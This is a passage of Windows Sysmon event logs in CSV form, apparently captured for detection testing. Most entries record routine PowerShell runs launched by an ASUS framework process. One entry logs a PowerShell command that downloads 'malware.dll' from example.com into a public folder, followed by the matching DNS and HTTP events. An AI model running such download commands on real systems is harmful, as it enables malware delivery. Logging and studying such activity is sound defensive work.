+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_gjmabnld.giu.ps1
+CreationUtcTime: 2025-07-20 21:06:33.272
+User: SHARON\Shxro"
+"20/07/2025 22:06:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:06:33.189
+ProcessGuid: {7f6f9216-5a59-687d-e408-000000006901}
+ProcessId: 19832
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:06:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:06:03.254
+ProcessGuid: {7f6f9216-5a3b-687d-e208-000000006901}
+ProcessId: 26484
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_3c220dq2.frm.ps1
+CreationUtcTime: 2025-07-20 21:06:03.254
+User: SHARON\Shxro"
+"20/07/2025 22:06:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:06:03.181
+ProcessGuid: {7f6f9216-5a3b-687d-e208-000000006901}
+ProcessId: 26484
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:05:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:05:33.250
+ProcessGuid: {7f6f9216-5a1d-687d-dd08-000000006901}
+ProcessId: 12452
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_mfv1heyd.ses.ps1
+CreationUtcTime: 2025-07-20 21:05:33.250
+User: SHARON\Shxro"
+"20/07/2025 22:05:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:05:33.175
+ProcessGuid: {7f6f9216-5a1d-687d-dd08-000000006901}
+ProcessId: 12452
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:05:21","22","Dns query:
+RuleName: -
+UtcTime: 2025-07-20 21:05:19.226
+ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ProcessId: 12256
+QueryName: example.com
+QueryStatus: 0
+QueryResults: ::ffff:23.192.228.84;::ffff:23.215.0.136;::ffff:23.215.0.138;::ffff:96.7.128.175;::ffff:96.7.128.198;::ffff:23.192.228.80;
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: SHARON\Shxro"
+"20/07/2025 22:05:20","3","Network connection detected:
+RuleName: -
+UtcTime: 2025-07-20 21:05:19.504
+ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ProcessId: 12256
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: SHARON\Shxro
+Protocol: tcp
+Initiated: true
+SourceIsIpv6: false
+SourceIp: 192.168.1.128
+SourceHostname: Sharon.lan
+SourcePort: 52871
+SourcePortName: -
+DestinationIsIpv6: false
+DestinationIp: 23.192.228.84
+DestinationHostname: a23-192-228-84.deploy.static.akamaitechnologies.com
+DestinationPort: 80
+DestinationPortName: http"
+"20/07/2025 22:05:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:05:03.236
+ProcessGuid: {7f6f9216-59ff-687d-d908-000000006901}
+ProcessId: 11424
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_sdnav3tr.yyh.ps1
+CreationUtcTime: 2025-07-20 21:05:03.236
+User: SHARON\Shxro"
+"20/07/2025 22:05:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:05:03.160
+ProcessGuid: {7f6f9216-59ff-687d-d908-000000006901}
+ProcessId: 11424
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:04:33","3","Network connection detected:
+RuleName: -
+UtcTime: 2025-07-20 21:04:31.084
+ProcessGuid: {7f6f9216-59de-687d-d208-000000006901}
+ProcessId: 15056
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: SHARON\Shxro
+Protocol: tcp
+Initiated: true
+SourceIsIpv6: false
+SourceIp: 192.168.1.128
+SourceHostname: Sharon.lan
+SourcePort: 52867
+SourcePortName: -
+DestinationIsIpv6: false
+DestinationIp: 23.192.228.84
+DestinationHostname: -
+DestinationPort: 80
+DestinationPortName: http"
+"20/07/2025 22:04:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:04:33.221
+ProcessGuid: {7f6f9216-59e1-687d-d308-000000006901}
+ProcessId: 27340
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_lx2vn1te.evd.ps1
+CreationUtcTime: 2025-07-20 21:04:33.221
+User: SHARON\Shxro"
+"20/07/2025 22:04:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:04:33.147
+ProcessGuid: {7f6f9216-59e1-687d-d308-000000006901}
+ProcessId: 27340
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:04:32","22","Dns query:
+RuleName: -
+UtcTime: 2025-07-20 21:04:30.931
+ProcessGuid: {7f6f9216-59de-687d-d208-000000006901}
+ProcessId: 15056
+QueryName: example.com
+QueryStatus: 0
+QueryResults: ::ffff:23.192.228.84;::ffff:23.215.0.136;::ffff:23.215.0.138;::ffff:96.7.128.175;::ffff:96.7.128.198;::ffff:23.192.228.80;
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+User: SHARON\Shxro"
+"20/07/2025 22:04:30","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:04:30.787
+ProcessGuid: {7f6f9216-59de-687d-d208-000000006901}
+ProcessId: 15056
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_wqom1tfi.gtp.ps1
+CreationUtcTime: 2025-07-20 21:04:30.787
+User: SHARON\Shxro"
+"20/07/2025 22:04:30","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:04:30.728
+ProcessGuid: {7f6f9216-59de-687d-d208-000000006901}
+ProcessId: 15056
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -Command ""Invoke-WebRequest -Uri http://example.com/malware.dll -OutFile C:\Users\Public\malware.dll""
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=9D8E30DAF21108092D5980C931876B7E,SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
+ParentProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ParentProcessId: 12256
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:04:12","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:04:12.266
+ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ProcessId: 12256
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_heygfjnk.afu.ps1
+CreationUtcTime: 2025-07-20 21:04:12.266
+User: SHARON\Shxro"
+"20/07/2025 22:04:12","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:04:12.068
+ProcessGuid: {7f6f9216-59cc-687d-d008-000000006901}
+ProcessId: 12256
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=9D8E30DAF21108092D5980C931876B7E,SHA256=3247BCFD60F6DD25F34CB74B5889AB10EF1B3EC72B4D4B3D95B5B25B534560B8,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
+ParentProcessGuid: {7f6f9216-39ca-687d-1101-000000006901}
+ParentProcessId: 12968
+ParentImage: C:\Windows\explorer.exe
+ParentCommandLine: C:\WINDOWS\Explorer.EXE
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:04:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:04:03.221
+ProcessGuid: {7f6f9216-59c3-687d-ca08-000000006901}
+ProcessId: 23748
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_u3qrgj3c.2u1.ps1
+CreationUtcTime: 2025-07-20 21:04:03.220
+User: SHARON\Shxro"
+"20/07/2025 22:04:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:04:03.147
+ProcessGuid: {7f6f9216-59c3-687d-ca08-000000006901}
+ProcessId: 23748
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:03:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:03:33.213
+ProcessGuid: {7f6f9216-59a5-687d-c808-000000006901}
+ProcessId: 24276
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_4dp0fe3k.5hg.ps1
+CreationUtcTime: 2025-07-20 21:03:33.213
+User: SHARON\Shxro"
+"20/07/2025 22:03:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:03:33.140
+ProcessGuid: {7f6f9216-59a5-687d-c808-000000006901}
+ProcessId: 24276
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:03:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:03:03.209
+ProcessGuid: {7f6f9216-5987-687d-c508-000000006901}
+ProcessId: 28224
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_1x5t00rh.xdu.ps1
+CreationUtcTime: 2025-07-20 21:03:03.209
+User: SHARON\Shxro"
+"20/07/2025 22:03:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:03:03.135
+ProcessGuid: {7f6f9216-5987-687d-c508-000000006901}
+ProcessId: 28224
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:02:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:02:33.197
+ProcessGuid: {7f6f9216-5969-687d-c308-000000006901}
+ProcessId: 19352
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_x4wj2mdk.m0t.ps1
+CreationUtcTime: 2025-07-20 21:02:33.197
+User: SHARON\Shxro"
+"20/07/2025 22:02:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:02:33.121
+ProcessGuid: {7f6f9216-5969-687d-c308-000000006901}
+ProcessId: 19352
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:02:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:02:03.288
+ProcessGuid: {7f6f9216-594b-687d-c008-000000006901}
+ProcessId: 25784
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_eixwj30i.ewj.ps1
+CreationUtcTime: 2025-07-20 21:02:03.288
+User: SHARON\Shxro"
+"20/07/2025 22:02:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:02:03.111
+ProcessGuid: {7f6f9216-594b-687d-c008-000000006901}
+ProcessId: 25784
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:01:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:01:33.215
+ProcessGuid: {7f6f9216-592d-687d-bb08-000000006901}
+ProcessId: 27060
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_cg3dyxv0.gen.ps1
+CreationUtcTime: 2025-07-20 21:01:33.215
+User: SHARON\Shxro"
+"20/07/2025 22:01:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:01:33.102
+ProcessGuid: {7f6f9216-592d-687d-bb08-000000006901}
+ProcessId: 27060
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:01:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:01:03.176
+ProcessGuid: {7f6f9216-590f-687d-b908-000000006901}
+ProcessId: 28296
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_edmfrfp0.deh.ps1
+CreationUtcTime: 2025-07-20 21:01:03.176
+User: SHARON\Shxro"
+"20/07/2025 22:01:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:01:03.098
+ProcessGuid: {7f6f9216-590f-687d-b908-000000006901}
+ProcessId: 28296
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:00:33","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:00:33.171
+ProcessGuid: {7f6f9216-58f1-687d-b608-000000006901}
+ProcessId: 3188
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_q4zaseef.hdh.ps1
+CreationUtcTime: 2025-07-20 21:00:33.171
+User: SHARON\Shxro"
+"20/07/2025 22:00:33","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:00:33.095
+ProcessGuid: {7f6f9216-58f1-687d-b608-000000006901}
+ProcessId: 3188
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
